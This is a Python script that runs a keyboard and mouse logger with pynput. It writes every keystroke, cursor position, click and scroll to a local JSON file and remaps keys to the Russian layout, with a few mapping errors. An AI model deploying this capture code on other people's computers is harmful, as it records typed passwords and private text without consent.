from pynput.keyboard import Key, Listener
from pynput import keyboard
from pynput import mouse
import copy
import json
import time
from tkinter.messagebox import showinfo
import os



data = {
"key": '',
"language": "english",
"mouseX": 0,
"mouseY": 0,
"scrollUp": "",
"scrollDown": "",
"Right": "",
"Left":""
}

switch = False
SHIFT_STATE = False

exit = False

f = open('FileKey.json')
  

dataKey = json.load(f)

fileName = dataKey['key']

def on_press(key):

    global exit
    if exit:
        # Stop listener
        return False
    global SHIFT_STATE
    global switch
    if key == keyboard.Key.shift:
        SHIFT_STATE = True
    else:
        if SHIFT_STATE:
            print(f'shift + {key}')
            if key == keyboard.Key.alt_l:
                switch = not switch
                #print("Да чувак")
                if not switch:
                    data['language'] = "english"
                else:
                    data['language'] = "rassian"
  

    if switch == True  and key == keyboard.KeyCode.from_char('w'):
        key = keyboard.KeyCode(char='ц')
    if switch == True  and key == keyboard.KeyCode.from_char('q'):
        key = keyboard.KeyCode(char='й')
    if switch == True  and key == keyboard.KeyCode.from_char('e'):
        key = keyboard.KeyCode(char='e')

    if switch == True  and key == keyboard.KeyCode.from_char('r'):
        key = keyboard.KeyCode(char='к')
    if switch == True  and key == keyboard.KeyCode.from_char('t'):
        key = keyboard.KeyCode(char='е')
    if switch == True  and key == keyboard.KeyCode.from_char('y'):
        key = keyboard.KeyCode(char='н')

    if switch == True  and key == keyboard.KeyCode.from_char('u'):
        key = keyboard.KeyCode(char='г')
    if switch == True  and key == keyboard.KeyCode.from_char('i'):
        key = keyboard.KeyCode(char='ш')
    if switch == True  and key == keyboard.KeyCode.from_char('o'):
        key = keyboard.KeyCode(char='щ')

    if switch == True  and key == keyboard.KeyCode.from_char('p'):
        key = keyboard.KeyCode(char='з')
    if switch == True  and key == keyboard.KeyCode.from_char('a'):
        key = keyboard.KeyCode(char='ф')
    if switch == True  and key == keyboard.KeyCode.from_char('s'):
        key = keyboard.KeyCode(char='ы')

    if switch == True  and key == keyboard.KeyCode.from_char('d'):
        key = keyboard.KeyCode(char='в')
    if switch == True  and key == keyboard.KeyCode.from_char('f'):
        key = keyboard.KeyCode(char='а')
    if switch == True  and key == keyboard.KeyCode.from_char('g'):
        key = keyboard.KeyCode(char='п')

    if switch == True  and key == keyboard.KeyCode.from_char('h'):
        key = keyboard.KeyCode(char='р')
    if switch == True  and key == keyboard.KeyCode.from_char('j'):
        key = keyboard.KeyCode(char='о')
    if switch == True  and key == keyboard.KeyCode.from_char('k'):
        key = keyboard.KeyCode(char='л')
    
    if switch == True  and key == keyboard.KeyCode.from_char('l'):
        key = keyboard.KeyCode(char='д')
    if switch == True  and key == keyboard.KeyCode.from_char('z'):
        key = keyboard.KeyCode(char='я')
    if switch == True  and key == keyboard.KeyCode.from_char('x'):
        key = keyboard.KeyCode(char='ч')

    if switch == True  and key == keyboard.KeyCode.from_char('c'):
        key = keyboard.KeyCode(char='с')
    if switch == True  and key == keyboard.KeyCode.from_char('v'):
        key = keyboard.KeyCode(char='м')
    if switch == True  and key == keyboard.KeyCode.from_char('b'):
        key = keyboard.KeyCode(char='и')

    if switch == True  and key == keyboard.KeyCode.from_char('n'):
        key = keyboard.KeyCode(char='т')
    if switch == True  and key == keyboard.KeyCode.from_char('m'):
        key = keyboard.KeyCode(char='ь')

    if switch == True  and key == keyboard.KeyCode.from_char('['):
        key = keyboard.KeyCode(char='х')
    if switch == True  and key == keyboard.KeyCode.from_char(']'):
        key = keyboard.KeyCode(char='ъ')

    if switch == True  and key == keyboard.KeyCode.from_char(';'):
        key = keyboard.KeyCode(char='х')
    if switch == True  and key == keyboard.KeyCode.from_char("'"):
        key = keyboard.KeyCode(char='э')

    if switch == True  and key == keyboard.KeyCode.from_char(','):
        key = keyboard.KeyCode(char='б')
    if switch == True  and key == keyboard.KeyCode.from_char("."):
        key = keyboard.KeyCode(char='ю')


    data['key'] = data['key'] + format(key)

    json_string = json.dumps(data, ensure_ascii=False)
    
    with open("keybord_and_mouse"+fileName+".json", "w") as json_file:
        json_file.write(json_string)
    
    filename = "keybord_and_mouse"+fileName+".json"
    if not os.path.exists(filename):
        showinfo(title='Файл', message='файл не был создан')
    
    print('{0} pressed'.format(
        key))
    
   

        


def on_release(key):
    global SHIFT_STATE
    global exit
    if exit:
        return False
    elif key == keyboard.Key.shift:
        SHIFT_STATE = False



def on_move(x, y):
    global exit
    print('Pointer moved to {0}'.format(
        (x, y)))
    
   
    data['mouseX'] = x
    data['mouseY'] = y
    
    json_string = json.dumps(data, ensure_ascii=False)
    
    with open("keybord_and_mouse"+fileName+".json", "w") as json_file:
        json_file.write(json_string)
    
    filename = "keybord_and_mouse"+fileName+".json"
    if not os.path.exists(filename):
        showinfo(title='Файл', message='файл не был создан')
    if exit:
         return False
    
    data['scrollDown'] = ""
    data['scrollUp'] = ""
    data['Left'] = ""
    data['Right'] = ""

def click(x, y, button, pressed):
    data['scrollDown'] = ""
    data['scrollUp'] = ""
    print("Mouse is Clicked at (",x,",",y,")","with",button)
    if exit:
         return False
    if str(button) == "Button.left":
        data['Left'] = "click"
    else:
        data['Right'] = "click"
    
    json_string = json.dumps(data, ensure_ascii=False)
    
    with open("keybord_and_mouse"+fileName+".json", "w") as json_file:
        json_file.write(json_string)
    
    filename = "keybord_and_mouse"+fileName+".json"
    if not os.path.exists(filename):
        showinfo(title='Файл', message='файл не был создан')

def on_scroll(x, y, dx, dy):
    print('Scrolled {0} at {1}'.format(
        'down' if dy < 0 else 'up',
        (x, y)))
    
    if dy < 0:
        data['scrollDown'] = "on"
    else:
        data['scrollUp'] = "on"
    if exit:
         return False

    json_string = json.dumps(data, ensure_ascii=False)
    
    

    with open("keybord_and_mouse"+fileName+".json", "w") as json_file:
        json_file.write(json_string)

    filename = "keybord_and_mouse"+fileName+".json"
    if not os.path.exists(filename):
        showinfo(title='Файл', message='файл не был создан')

def keylogger():
    
    keyboard_listener =  Listener(
                on_press=on_press, on_release=on_release)
    
    mouse_listener = mouse.Listener(
                    on_move=on_move,
                    on_click=click,
                    on_scroll=on_scroll)

    
    keyboard_listener.start()
    mouse_listener.start()
    mouse_listener.join()
    keyboard_listener.join()
    time.sleep(100)

    

keylogger()
